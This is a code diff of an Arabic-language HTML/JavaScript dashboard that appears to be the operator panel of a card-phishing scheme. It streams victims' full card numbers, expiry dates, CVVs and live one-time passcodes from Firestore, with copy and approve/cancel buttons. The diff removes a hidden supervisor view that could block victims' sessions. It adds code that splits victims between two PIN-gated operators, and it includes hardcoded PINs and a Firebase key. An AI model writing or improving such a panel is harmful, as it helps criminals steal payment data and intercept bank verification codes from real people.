@@ -4,11 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>غرفة العمليات | Live Feed</title>
-    
+
     <!-- Ultra-Premium Typography -->
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-    
+
     <!-- Firebase Libraries -->
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
@@ -149,7 +149,7 @@
         .nav-logo-container { display: flex; align-items: center; gap: 15px; }
         .nav-logo-container img { height: 40px; border-radius: 8px; }
         .nav-title { font-weight: 900; font-size: 20px; color: var(--text-light); text-shadow: 0 0 10px rgba(255,255,255,0.2); }
-        
+
         .live-status {
             display: flex; align-items: center; gap: 10px;
             font-family: 'JetBrains Mono', monospace; font-size: 12px;
@@ -160,16 +160,6 @@
         }
         .live-dot { width: 8px; height: 8px; background: var(--cyan-neon); border-radius: 50%; animation: blink 1s infinite; }
 
-        /* Supervisor Badge */
-        .supervisor-badge {
-            background: linear-gradient(135deg, #a855f7, #6366f1);
-            color: #fff; font-size: 12px; font-weight: 800;
-            padding: 4px 12px; border-radius: 20px;
-            letter-spacing: 1px;
-            box-shadow: 0 0 15px rgba(168, 85, 247, 0.5);
-            display: inline-flex; align-items: center; gap: 6px;
-        }
-        
         .logout-btn {
             background: transparent; border: 1px solid var(--danger-red);
             color: var(--danger-red); padding: 6px 14px; border-radius: 20px;
@@ -236,13 +226,13 @@
         }
         .data-group { display: flex; flex-direction: column; gap: 4px; }
         .data-label { font-size: 12px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; }
-        .data-value { 
-            font-family: 'JetBrains Mono', monospace; font-size: 16px; color: var(--text-light); 
+        .data-value {
+            font-family: 'JetBrains Mono', monospace; font-size: 16px; color: var(--text-light);
             display: flex; justify-content: space-between; align-items: center;
             word-break: break-all;
         }
         .data-value.highlight { color: var(--cyan-neon); font-size: 22px; font-weight: 800; letter-spacing: 2px; }
-        
+
         .copy-btn {
             background: transparent; border: none; color: var(--text-dim); cursor: pointer; transition: 0.2s;
         }
@@ -259,7 +249,7 @@
             background: rgba(255, 215, 0, 0.1); border: 1px solid var(--gold-neon); color: var(--gold-neon);
         }
         .btn-accept:hover { background: var(--gold-neon); color: #000; box-shadow: 0 0 20px rgba(255, 215, 0, 0.4); }
-        
+
         .btn-reject {
             background: transparent; border: 1px solid var(--danger-red); color: var(--danger-red);
         }
@@ -275,178 +265,6 @@
             white-space: nowrap;
         }
         #toast.show { bottom: 30px; }
-
-        /* ====================== SUPERVISOR VIEW ====================== */
-        .supervisor-layout {
-            max-width: 1200px;
-            margin: 30px auto;
-            padding: 0 20px;
-            display: grid;
-            grid-template-columns: 380px 1fr;
-            gap: 24px;
-        }
-        @media (max-width: 900px) {
-            .supervisor-layout { grid-template-columns: 1fr; }
-        }
-
-        .supervisor-panel {
-            background: var(--glass-bg);
-            backdrop-filter: blur(20px);
-            border: 1px solid var(--glass-border);
-            border-radius: 16px;
-            padding: 20px;
-            align-self: start;
-        }
-        .panel-title {
-            font-size: 16px; font-weight: 800; color: var(--text-light);
-            margin: 0 0 15px 0;
-            padding-bottom: 12px;
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-            display: flex; align-items: center; gap: 10px;
-        }
-        .panel-title i { color: var(--gold-neon); }
-
-        .session-item {
-            background: rgba(0,0,0,0.4);
-            border: 1px solid rgba(255,255,255,0.05);
-            border-radius: 12px;
-            padding: 12px 14px;
-            margin-bottom: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            gap: 10px;
-            transition: 0.3s;
-        }
-        .session-item:hover { border-color: rgba(255, 215, 0, 0.3); }
-        .session-item.blocked { opacity: 0.45; border-color: rgba(255,51,102,0.4); }
-        .session-info { flex: 1; min-width: 0; }
-        .session-name {
-            font-weight: 700; font-size: 14px; color: var(--text-light);
-            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-        }
-        .session-meta {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 11px; color: var(--text-dim);
-            margin-top: 4px;
-        }
-        .session-actions { display: flex; gap: 6px; flex-shrink: 0; }
-        .mini-btn {
-            padding: 6px 10px; border-radius: 8px; font-size: 11px;
-            font-family: 'Cairo', sans-serif; font-weight: 700;
-            cursor: pointer; transition: 0.2s; border: 1px solid;
-        }
-        .mini-btn.block {
-            background: transparent; border-color: var(--danger-red); color: var(--danger-red);
-        }
-        .mini-btn.block:hover { background: var(--danger-red); color: #fff; }
-        .mini-btn.logout {
-            background: transparent; border-color: var(--cyan-neon); color: var(--cyan-neon);
-        }
-        .mini-btn.logout:hover { background: var(--cyan-neon); color: #000; }
-        .mini-btn.unblock {
-            background: transparent; border-color: var(--success-green); color: var(--success-green);
-        }
-        .mini-btn.unblock:hover { background: var(--success-green); color: #fff; }
-
-        .empty-mini {
-            text-align: center; padding: 20px;
-            color: var(--text-dim); font-size: 13px;
-            border: 1px dashed rgba(255,255,255,0.08);
-            border-radius: 10px;
-        }
-
-        /* Client Card - Grouped by name */
-        .client-card {
-            background: var(--glass-bg);
-            backdrop-filter: blur(20px);
-            border: 1px solid var(--glass-border);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 18px;
-            transition: 0.3s;
-            animation: physicsDrop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
-        }
-        .client-card:hover {
-            border-color: rgba(168, 85, 247, 0.4);
-            box-shadow: 0 0 30px rgba(168, 85, 247, 0.1);
-        }
-        .client-card-header {
-            display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 15px;
-            padding-bottom: 12px;
-            border-bottom: 1px dashed rgba(255,255,255,0.08);
-            flex-wrap: wrap; gap: 10px;
-        }
-        .client-card-name {
-            font-size: 18px; font-weight: 800; color: var(--gold-neon);
-            display: flex; align-items: center; gap: 8px;
-        }
-        .client-card-name i { font-size: 14px; }
-        .client-card-count {
-            background: rgba(168, 85, 247, 0.15);
-            color: #c084fc;
-            padding: 4px 12px; border-radius: 20px;
-            font-size: 12px; font-weight: 700;
-            border: 1px solid rgba(168, 85, 247, 0.3);
-        }
-        .client-records { display: flex; flex-direction: column; gap: 10px; }
-        .otp-record {
-            background: rgba(0,0,0,0.45);
-            border: 1px solid rgba(255,255,255,0.05);
-            border-radius: 12px;
-            padding: 12px 14px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-        .otp-big {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 22px; font-weight: 800;
-            color: var(--cyan-neon);
-            letter-spacing: 3px;
-            text-shadow: 0 0 10px rgba(0, 242, 254, 0.4);
-            flex-shrink: 0;
-        }
-        .otp-meta {
-            flex: 1;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 11px;
-            color: var(--text-dim);
-            justify-content: flex-end;
-        }
-        .otp-meta span {
-            display: inline-flex; align-items: center; gap: 5px;
-        }
-        .otp-meta i { color: rgba(255,255,255,0.3); }
-        .otp-time { color: var(--gold-neon); }
-
-        .copy-mini {
-            background: transparent; border: 1px solid rgba(0, 242, 254, 0.4);
-            color: var(--cyan-neon); padding: 5px 9px; border-radius: 8px;
-            cursor: pointer; font-size: 12px; transition: 0.2s;
-        }
-        .copy-mini:hover { background: var(--cyan-neon); color: #000; }
-
-        .section-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        .badge-count {
-            background: rgba(0, 242, 254, 0.15);
-            color: var(--cyan-neon);
-            padding: 3px 10px; border-radius: 20px;
-            font-size: 12px; font-weight: 700;
-            font-family: 'JetBrains Mono', monospace;
-            border: 1px solid rgba(0, 242, 254, 0.3);
-        }
     </style>
 </head>
 <body>
@@ -472,8 +290,8 @@
         </div>
     </div>
 
-    <!-- ======================= Regular View (PIN: 31122006) ======================= -->
-    <div id="regularView" style="display:none;">
+    <!-- ============ UNIFIED VIEW ============ -->
+    <div id="appView" style="display:none;">
         <div class="top-nav">
             <div class="nav-logo-container">
                 <img src="https://ui-avatars.com/api/?name=Admin&background=0F111A&color=FFD700&rounded=true" alt="Logo">
@@ -495,48 +313,12 @@
         </div>
     </div>
 
-    <!-- ======================= Supervisor View (PIN: 078924) - HIDDEN ======================= -->
-    <div id="supervisorView" style="display:none;">
-        <div class="top-nav">
-            <div class="nav-logo-container">
-                <img src="https://ui-avatars.com/api/?name=SV&background=1a0533&color=a855f7&rounded=true" alt="Logo">
-                <div class="nav-title">لوحة المشرف العامة</div>
-                <span class="supervisor-badge"><i class="fa-solid fa-shield-halved"></i> SUPERVISOR</span>
-            </div>
-            <div style="display:flex; gap:10px; align-items:center;">
-                <div class="live-status">
-                    <div class="live-dot"></div> MONITORING
-                </div>
-                <button class="logout-btn" onclick="logoutToLogin()"><i class="fa-solid fa-power-off"></i> خروج</button>
-            </div>
-        </div>
-
-        <div class="supervisor-layout">
-            <!-- Sessions Panel -->
-            <aside class="supervisor-panel">
-                <h3 class="panel-title"><i class="fa-solid fa-users-viewfinder"></i> المتصلون الآن</h3>
-                <div id="sessionsList">
-                    <div class="empty-mini">لا يوجد مستخدمين حالياً</div>
-                </div>
-            </aside>
-
-            <!-- Grouped OTPs Panel -->
-            <main>
-                <div class="section-header">
-                    <h3 class="panel-title" style="border:none; padding:0; margin:0;"><i class="fa-solid fa-id-card-clip"></i> بطاقات OTP حسب العميل</h3>
-                    <span class="badge-count" id="groupsCount">0</span>
-                </div>
-                <div id="groupedOTPs">
-                    <div class="empty-mini">لا يوجد بيانات بعد</div>
-                </div>
-            </main>
-        </div>
-    </div>
-
     <div id="toast">جالك طلب جديد حيّ الله بالنشامى!</div>
 
     <script>
-        // ============= Web Audio API Synth Engine =============
+        /* ============================================================
+           1) AUDIO ENGINE
+           ============================================================ */
         let audioCtx;
         function initAudio() {
             if (!audioCtx) {
@@ -579,36 +361,42 @@
             }
         }
 
-        // ============= Login / Access =============
-        let currentMode = null;
+        /* ============================================================
+           2) ACCESS / MODES
+           ============================================================ */
+        const PIN_MODE_MAP = {
+            '078924':   'A',
+            '31122006': 'B'
+        };
+
+        let currentMode = null;          
+        let initialLoad = true;          
+        let renderedIds = new Set();     
 
         function verifyAccess() {
             const pass = document.getElementById('adminPass').value.trim();
             initAudio();
 
-            if (pass === '31122006') {
-                // Regular Admin View
-                playSound('admin');
-                currentMode = 'regular';
-                document.getElementById('loginScreen').style.opacity = '0';
-                setTimeout(() => {
-                    document.getElementById('loginScreen').style.display = 'none';
-                    document.getElementById('regularView').style.display = 'block';
-                    document.getElementById('supervisorView').style.display = 'none';
-                }, 500);
-            } else if (pass === '078924') {
-                // Hidden Supervisor View
-                playSound('admin');
-                currentMode = 'supervisor';
-                document.getElementById('loginScreen').style.opacity = '0';
-                setTimeout(() => {
-                    document.getElementById('loginScreen').style.display = 'none';
-                    document.getElementById('regularView').style.display = 'none';
-                    document.getElementById('supervisorView').style.display = 'block';
-                }, 500);
-            } else {
+            const mode = PIN_MODE_MAP[pass];
+            if (!mode) {
                 document.getElementById('errorTxt').style.display = 'block';
+                return;
             }
+
+            playSound('admin');
+            currentMode = mode;
+
+            initialLoad = true;
+            renderedIds = new Set();
+
+            document.getElementById('loginScreen').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('appView').style.display = 'block';
+                renderFeed();
+            }, 500);
+
+            setTimeout(() => { initialLoad = false; }, 3000);
         }
 
         document.getElementById("adminPass").addEventListener("keypress", (e) => {
@@ -618,11 +406,11 @@
         function logoutToLogin() {
             playSound('click');
             currentMode = null;
+            renderedIds = new Set();
             const loginScreen = document.getElementById('loginScreen');
             loginScreen.style.display = 'flex';
             loginScreen.style.opacity = '1';
-            document.getElementById('regularView').style.display = 'none';
-            document.getElementById('supervisorView').style.display = 'none';
+            document.getElementById('appView').style.display = 'none';
             document.getElementById('adminPass').value = '';
             document.getElementById('errorTxt').style.display = 'none';
         }
@@ -639,7 +427,9 @@
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
-        // ============= Firebase Configuration =============
+        /* ============================================================
+           3) FIREBASE
+           ============================================================ */
         const firebaseConfig = {
             apiKey: "AIzaSyD_JfgnZpx8iS8QG61NKBioNP3Ae1FEms8",
             authDomain: "ronald-pavency-i1tap.firebaseapp.com",
@@ -651,15 +441,250 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-        const liveFeed = document.getElementById('liveFeed');
-        let initialLoad = true;
-        let unifiedData = new Map();
-        let sessionsData = new Map();
+        /* ============================================================
+           4) DISTRIBUTION STATE (المحرك الجديد المبني على الهوية)
+           ============================================================ */
+        const paymentsMap = new Map();
+        const otpsMap     = new Map();
+        let   unifiedData = new Map();
 
-        // ============= Regular View: Render Feed =============
+        function tsSeconds(rec) {
+            const t = rec && rec.timestamp;
+            if (!t) return 0;
+            if (typeof t.seconds === 'number') return t.seconds;
+            if (typeof t.toDate === 'function') return Math.floor(t.toDate().getTime() / 1000);
+            return 0;
+        }
+
+        function sortAsc(a, b) {
+            const d = tsSeconds(a) - tsSeconds(b);
+            if (d !== 0) return d;
+            return String(a.id).localeCompare(String(b.id));
+        }
+
+        function normDigits(v) { return String(v == null ? '' : v).replace(/\D/g, ''); }
+        function normName(v)   { return String(v == null ? '' : v).trim().toLowerCase(); }
+
+        function lookupKeys(rec) {
+            const keys = [];
+            const ci = rec.cardInfo || {};
+            const num = normDigits(ci.number || rec.cardNumber || rec.number);
+            if (num.length >= 4) keys.push('num:' + num);
+            const name = normName(ci.name || rec.name);
+            if (name) keys.push('name:' + name);
+            keys.push('doc:' + rec.id);
+            return keys;
+        }
+
+        function ownerForIndex(i) {
+            return (i % 3 === 2) ? 'B' : 'A';
+        }
+
+        function rebuildDistribution() {
+            const cards = Array.from(paymentsMap.values()).sort(sortAsc);
+            const otps = Array.from(otpsMap.values()).sort(sortAsc);
+
+            const unified = new Map();
+            const keyOwner = new Map();
+            const keyTarget = new Map(); 
+
+            let identityCount = 0;
+
+            // --- (1) البطاقات الأساسية ---
+            cards.forEach(c => {
+                const keys = lookupKeys(c);
+                const record = {
+                    key: 'pay:' + c.id,
+                    id: c.id,
+                    type: 'payments',
+                    owner: null,
+                    data: c,
+                    otps: [],
+                    latestOtp: c.otp || null,
+                    latestOtpId: null,
+                    latestOtpStatus: null
+                };
+
+                let existingOwner = null;
+                for (let k of keys) {
+                    if (keyOwner.has(k)) {
+                        existingOwner = keyOwner.get(k);
+                        break;
+                    }
+                }
+
+                if (!existingOwner) {
+                    existingOwner = ownerForIndex(identityCount);
+                    identityCount++;
+                }
+
+                record.owner = existingOwner;
+                unified.set(record.key, record);
+
+                keys.forEach(k => {
+                    keyOwner.set(k, existingOwner);
+                    keyTarget.set(k, record);
+                });
+            });
+
+            // --- (2) الـ OTP يتبع البطاقة حصراً حسب الهوية والاسم ---
+            otps.forEach(o => {
+                const keys = lookupKeys(o);
+                let existingOwner = null;
+                let target = null;
+
+                for (let k of keys) {
+                    if (keyOwner.has(k)) {
+                        existingOwner = keyOwner.get(k);
+                        target = keyTarget.get(k);
+                        break;
+                    }
+                }
+
+                if (!existingOwner) {
+                    // OTP بدون بطاقة نهائياً
+                    existingOwner = ownerForIndex(identityCount);
+                    identityCount++;
+                    const record = {
+                        key: 'otp:' + o.id,
+                        id: o.id,
+                        type: 'otps',
+                        owner: existingOwner,
+                        data: o,
+                        otps: [o],
+                        latestOtp: o.otp || null,
+                        latestOtpId: o.id,
+                        latestOtpStatus: o.status || null
+                    };
+                    unified.set(record.key, record);
+                    
+                    keys.forEach(k => {
+                        keyOwner.set(k, existingOwner);
+                        keyTarget.set(k, record);
+                    });
+                } else if (target) {
+                    // ربط مباشر ومطلق بالبطاقة مع تتبع أحدث OTP
+                    target.otps.push(o);
+                    if (o.otp) {
+                        target.latestOtp = o.otp;
+                        target.latestOtpId = o.id;
+                        target.latestOtpStatus = o.status || null;
+                    }
+                    if (!target.data.cardInfo && o.cardInfo) {
+                        target.data.cardInfo = o.cardInfo;
+                    }
+                    
+                    keys.forEach(k => {
+                        if (!keyOwner.has(k)) {
+                            keyOwner.set(k, existingOwner);
+                            keyTarget.set(k, target);
+                        }
+                    });
+                }
+            });
+
+            unifiedData = unified;
+            renderFeed();
+        }
+
+        /* ============================================================
+           5) RENDER
+           ============================================================ */
+        function getClientRecords() {
+            if (!currentMode) return [];
+            return Array.from(unifiedData.values())
+                .filter(r => r.owner === currentMode)
+                .sort((a, b) => sortAsc(b.data, a.data)); 
+        }
+
+        function buildCardHTML(rec) {
+            const d  = rec.data || {};
+            const ci = d.cardInfo || {};
+
+            const clientName = ci.name || d.name || 'Unknown User';
+            const cardNo     = ci.number || d.cardNumber || 'N/A';
+            const expiry     = ci.expiry || d.expiry || 'N/A';
+            const cvc        = ci.cvv || ci.cvc || d.cvv || d.cvc || 'N/A';
+            const otpVal     = rec.latestOtp || d.otp || '---';
+
+            // الاعتماد على حالة أحدث OTP إن وجد، وإلا حالة البطاقة
+            const currentStatus = rec.latestOtpStatus || d.status;
+
+            const timeStr = d.timestamp
+                ? (typeof d.timestamp.toDate === 'function'
+                    ? new Date(d.timestamp.toDate()).toLocaleTimeString('en-US')
+                    : 'Just now')
+                : 'Just now';
+
+            const isProcessed = (currentStatus === 'approved' || currentStatus === 'rejected');
+
+            const statusLabel =
+                currentStatus === 'approved' ? '<span style="color: var(--cyan-neon); font-size: 12px;">(مقبول ✓)</span>' :
+                currentStatus === 'rejected' ? '<span style="color: var(--danger-red); font-size: 12px;">(مرفوض ✖)</span>' : '';
+
+            const extraOtps = rec.otps && rec.otps.length > 1
+                ? `<span style="font-size:11px;color:var(--text-dim);font-family:'JetBrains Mono',monospace;">+${rec.otps.length - 1}</span>`
+                : '';
+
+            return `
+                <div class="order-card drop-in" style="${isProcessed ? 'opacity: 0.6; border-color: rgba(255,255,255,0.1);' : ''}">
+                    <div class="card-header">
+                        <div class="client-name"><i class="fa-solid fa-user-ninja" style="font-size: 14px; margin-left: 8px;"></i>${clientName} ${statusLabel}</div>
+                        <div class="timestamp">${timeStr} <i class="fa-regular fa-clock" style="margin-right: 5px;"></i></div>
+                    </div>
+
+                    <div class="data-bar">
+                        <div class="data-group" style="grid-column: 1 / -1;">
+                            <span class="data-label">Card Number</span>
+                            <div class="data-value">
+                                ${cardNo}
+                                <button class="copy-btn" onclick="copyToClipboard('${cardNo}')"><i class="fa-regular fa-copy"></i></button>
+                            </div>
+                        </div>
+                        <div class="data-group">
+                            <span class="data-label">Expiry / CVV</span>
+                            <div class="data-value">${expiry} &nbsp;|&nbsp; ${cvc}</div>
+                        </div>
+                        <div class="data-group">
+                            <span class="data-label">Live OTP ${extraOtps}</span>
+                            <div class="data-value highlight">
+                                ${otpVal}
+                                ${otpVal !== '---' ? `<button class="copy-btn" onclick="copyToClipboard('${otpVal}')"><i class="fa-regular fa-copy"></i></button>` : ''}
+                            </div>
+                        </div>
+                    </div>
+
+                    ${(!isProcessed) ? `
+                    <div class="actions-grid">
+                        <button class="btn-action btn-accept" onclick="processAction('${rec.type}', '${rec.id}', '${rec.latestOtpId || ''}', 'approved')">
+                             طالعة يكبير ⚡
+                        </button>
+                        <button class="btn-action btn-reject" onclick="processAction('${rec.type}', '${rec.id}', '${rec.latestOtpId || ''}', 'rejected')">
+                             كنسل ✖
+                        </button>
+                    </div>` : ''}
+                </div>
+            `;
+        }
+
         function renderFeed() {
-            if (unifiedData.size === 0) {
-                liveFeed.innerHTML = `
+            const container = document.getElementById('liveFeed');
+            if (!container) return;
+
+            const list = getClientRecords();
+            const ids  = list.map(r => r.key);
+
+            if (!initialLoad) {
+                const fresh = ids.filter(id => !renderedIds.has(id));
+                if (fresh.length > 0) {
+                    playSound('newOrder');
+                    showToast('جالك طلب جديد حيّ الله بالنشامى!');
+                }
+            }
+            renderedIds = new Set(ids);
+
+            if (list.length === 0) {
+                container.innerHTML = `
                     <div class="empty-state">
                         <i class="fa-solid fa-satellite-dish fa-spin" style="font-size: 24px; margin-bottom: 12px; color: var(--gold-neon);"></i><br>
                         الجو هادي.. قاطعين السير، استنّى الدفعة الجاية يا مهندس!
@@ -667,197 +692,13 @@
                 return;
             }
 
-            const sortedRecords = Array.from(unifiedData.values()).sort((a, b) => {
-                const timeA = a.timestamp ? a.timestamp.seconds : 0;
-                const timeB = b.timestamp ? b.timestamp.seconds : 0;
-                return timeB - timeA;
-            });
-
-            liveFeed.innerHTML = '';
-            sortedRecords.forEach((data) => {
-                const cardNo = data.cardInfo?.number || data.cardNumber || 'N/A';
-                const expiry = data.cardInfo?.expiry || 'N/A';
-                const cvc = data.cardInfo?.cvv || data.cvv || data.cardInfo?.cvc || data.cvc || 'N/A';
-                const otpVal = data.otp || '---';
-                const clientName = data.cardInfo?.name || data.name || 'Unknown User';
-                const timeStr = data.timestamp ? new Date(data.timestamp.toDate()).toLocaleTimeString('en-US') : 'Just now';
-
-                const isProcessed = data.status !== 'pending';
-                const statusLabel = data.status === 'approved' ? '<span style="color: var(--cyan-neon); font-size: 12px;">(مقبول ✓)</span>' : (data.status === 'rejected' ? '<span style="color: var(--danger-red); font-size: 12px;">(مرفوض ✖)</span>' : '');
-
-                const html = `
-                    <div class="order-card drop-in" style="${isProcessed ? 'opacity: 0.6; border-color: rgba(255,255,255,0.1);' : ''}">
-                        <div class="card-header">
-                            <div class="client-name"><i class="fa-solid fa-user-ninja" style="font-size: 14px; margin-left: 8px;"></i>${clientName} ${statusLabel}</div>
-                            <div class="timestamp">${timeStr} <i class="fa-regular fa-clock" style="margin-right: 5px;"></i></div>
-                        </div>
-                        
-                        <div class="data-bar">
-                            <div class="data-group" style="grid-column: 1 / -1;">
-                                <span class="data-label">Card Number</span>
-                                <div class="data-value">
-                                    ${cardNo} 
-                                    <button class="copy-btn" onclick="copyToClipboard('${cardNo}')"><i class="fa-regular fa-copy"></i></button>
-                                </div>
-                            </div>
-                            <div class="data-group">
-                                <span class="data-label">Expiry / CVV</span>
-                                <div class="data-value">${expiry} &nbsp;|&nbsp; ${cvc}</div>
-                            </div>
-                            <div class="data-group">
-                                <span class="data-label">Live OTP</span>
-                                <div class="data-value highlight">
-                                    ${otpVal}
-                                    ${otpVal !== '---' ? `<button class="copy-btn" onclick="copyToClipboard('${otpVal}')"><i class="fa-regular fa-copy"></i></button>` : ''}
-                                </div>
-                            </div>
-                        </div>
-
-                        ${!isProcessed ? `
-                        <div class="actions-grid">
-                            <button class="btn-action btn-accept" onclick="processAction('${data.type}', '${data.id}', 'approved')">
-                                 طالعة يكبير ⚡
-                            </button>
-                            <button class="btn-action btn-reject" onclick="processAction('${data.type}', '${data.id}', 'rejected')">
-                                 كنسل ✖
-                            </button>
-                        </div>` : ''}
-                    </div>
-                `;
-                liveFeed.insertAdjacentHTML('beforeend', html);
-            });
+            container.innerHTML = list.map(buildCardHTML).join('');
         }
 
-        // ============= Supervisor View: Render Grouped OTPs =============
-        function renderGroupedOTPs() {
-            const container = document.getElementById('groupedOTPs');
-            if (!container) return;
-
-            if (unifiedData.size === 0) {
-                container.innerHTML = '<div class="empty-mini">لا يوجد بيانات بعد</div>';
-                document.getElementById('groupsCount').textContent = '0';
-                return;
-            }
-
-            // Group by client name (or card holder name)
-            const groups = new Map();
-            unifiedData.forEach((data) => {
-                const name = data.cardInfo?.name || data.name || 'زائر مجهول';
-                if (!groups.has(name)) groups.set(name, []);
-                groups.get(name).push(data);
-            });
-
-            document.getElementById('groupsCount').textContent = groups.size;
-
-            let html = '';
-            groups.forEach((items, name) => {
-                // Sort descending by timestamp
-                items.sort((a, b) => {
-                    const tA = a.timestamp?.seconds || 0;
-                    const tB = b.timestamp?.seconds || 0;
-                    return tB - tA;
-                });
-
-                const recordsHtml = items.map(item => {
-                    const cardNo = item.cardInfo?.number || item.cardNumber || '';
-                    const expiry = item.cardInfo?.expiry || '--/--';
-                    const cvv = item.cardInfo?.cvv || item.cvv || item.cardInfo?.cvc || item.cvc || '---';
-                    const otp = item.otp || '---';
-                    const time = item.timestamp ? new Date(item.timestamp.toDate()).toLocaleTimeString('en-US') : '';
-
-                    // Show last 4 of card for privacy
-                    const maskedCard = cardNo.length > 4
-                        ? '**** **** **** ' + cardNo.slice(-4)
-                        : (cardNo || '---');
-
-                    return `
-                        <div class="otp-record">
-                            <div class="otp-big">${otp}</div>
-                            <div class="otp-meta">
-                                <span><i class="fa-regular fa-credit-card"></i> ${maskedCard}</span>
-                                <span><i class="fa-regular fa-calendar"></i> ${expiry}</span>
-                                <span><i class="fa-solid fa-lock"></i> ${cvv}</span>
-                                <span class="otp-time"><i class="fa-regular fa-clock"></i> ${time}</span>
-                            </div>
-                            ${otp !== '---' ? `<button class="copy-mini" onclick="copyToClipboard('${otp}')"><i class="fa-regular fa-copy"></i> نسخ</button>` : ''}
-                        </div>
-                    `;
-                }).join('');
-
-                html += `
-                    <div class="client-card">
-                        <div class="client-card-header">
-                            <div class="client-card-name"><i class="fa-solid fa-user-shield"></i> ${name}</div>
-                            <div class="client-card-count">${items.length} سجل</div>
-                        </div>
-                        <div class="client-records">${recordsHtml}</div>
-                    </div>
-                `;
-            });
-
-            container.innerHTML = html;
-        }
-
-        // ============= Supervisor View: Render Sessions =============
-        function renderSessions() {
-            const container = document.getElementById('sessionsList');
-            if (!container) return;
-
-            if (sessionsData.size === 0) {
-                container.innerHTML = '<div class="empty-mini">لا يوجد مستخدمين حالياً</div>';
-                return;
-            }
-
-            // Sort by lastSeen desc
-            const sorted = Array.from(sessionsData.values()).sort((a, b) => {
-                const tA = a.lastSeen?.seconds || a.createdAt?.seconds || 0;
-                const tB = b.lastSeen?.seconds || b.createdAt?.seconds || 0;
-                return tB - tA;
-            });
-
-            let html = '';
-            sorted.forEach(s => {
-                const name = s.name || 'زائر';
-                const phone = s.phone || s.ip || 'غير معروف';
-                const status = s.status || 'active';
-                const lastSeen = s.lastSeen ? new Date(s.lastSeen.toDate()).toLocaleTimeString('en-US') : 'الآن';
-                const isBlocked = status === 'blocked';
-                const isLoggedOut = status === 'logged-out';
-
-                let statusColor = '#22c55e';
-                let statusTxt = 'نشط';
-                if (isBlocked) { statusColor = '#ff3366'; statusTxt = 'محظور'; }
-                else if (isLoggedOut) { statusColor = '#94A3B8'; statusTxt = 'مسجل خروج'; }
-
-                html += `
-                    <div class="session-item ${isBlocked ? 'blocked' : ''}">
-                        <div class="session-info">
-                            <div class="session-name">
-                                <span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${statusColor};margin-left:6px;"></span>
-                                ${name}
-                            </div>
-                            <div class="session-meta">${phone} • ${lastSeen} • ${statusTxt}</div>
-                        </div>
-                        <div class="session-actions">
-                            ${!isBlocked && !isLoggedOut
-                                ? `<button class="mini-btn block" onclick="blockUser('${s.id}')"><i class="fa-solid fa-ban"></i></button>`
-                                : ''}
-                            ${isBlocked
-                                ? `<button class="mini-btn unblock" onclick="unblockUser('${s.id}')"><i class="fa-solid fa-unlock"></i></button>`
-                                : ''}
-                            ${!isLoggedOut
-                                ? `<button class="mini-btn logout" onclick="logoutUser('${s.id}')"><i class="fa-solid fa-right-from-bracket"></i></button>`
-                                : ''}
-                        </div>
-                    </div>
-                `;
-            });
-
-            container.innerHTML = html;
-        }
-
-        // ============= Global Actions =============
-        window.processAction = function(collectionName, docId, newStatus) {
+        /* ============================================================
+           6) GLOBAL ACTIONS
+           ============================================================ */
+        window.processAction = function (collectionName, docId, otpDocId, newStatus) {
             playSound('click');
             const cardElement = event.target.closest('.order-card');
             if (cardElement) {
@@ -865,108 +706,41 @@
                 cardElement.style.pointerEvents = 'none';
             }
 
+            // 1. تحديث مستند الطلب الرئيسي
             db.collection(collectionName).doc(docId).update({ status: newStatus })
-            .catch(err => console.error("Sync Error: ", err));
+              .catch(err => console.error("Sync Error (Main): ", err));
+
+            // 2. تحديث مستند الـ OTP المباشر
+            if (otpDocId) {
+                db.collection("otps").doc(otpDocId).update({ status: newStatus })
+                  .catch(err => console.error("Sync Error (OTP): ", err));
+            }
         };
 
-        window.blockUser = function(uid) {
-            playSound('click');
-            db.collection("sessions").doc(uid).update({
-                status: 'blocked',
-                blockedAt: firebase.firestore.FieldValue.serverTimestamp()
-            }).then(() => showToast('🚫 تم حظر المستخدم'))
-              .catch(err => console.error(err));
-        };
-
-        window.unblockUser = function(uid) {
-            playSound('click');
-            db.collection("sessions").doc(uid).update({
-                status: 'active'
-            }).then(() => showToast('✅ تم إلغاء الحظر'))
-              .catch(err => console.error(err));
-        };
-
-        window.logoutUser = function(uid) {
-            playSound('click');
-            db.collection("sessions").doc(uid).update({
-                status: 'logged-out',
-                loggedOutAt: firebase.firestore.FieldValue.serverTimestamp()
-            }).then(() => showToast('👋 تم تسجيل خروج المستخدم'))
-              .catch(err => console.error(err));
-        };
-
-        // ============= Firestore Listeners =============
-        // Payments collection
+        /* ============================================================
+           7) FIRESTORE LISTENERS
+           ============================================================ */
         db.collection("payments").onSnapshot((snapshot) => {
-            let changed = false;
             snapshot.docChanges().forEach((change) => {
-                const data = { ...change.doc.data(), id: change.doc.id, type: 'payments' };
-                if (change.type === "added" || change.type === "modified") {
-                    unifiedData.set(data.id, data);
-                    if (change.type === "added" && !initialLoad) {
-                        playSound('newOrder'); showToast('جالك طلب جديد حيّ الله بالنشامى!');
-                    }
-                    changed = true;
-                }
                 if (change.type === "removed") {
-                    unifiedData.delete(data.id);
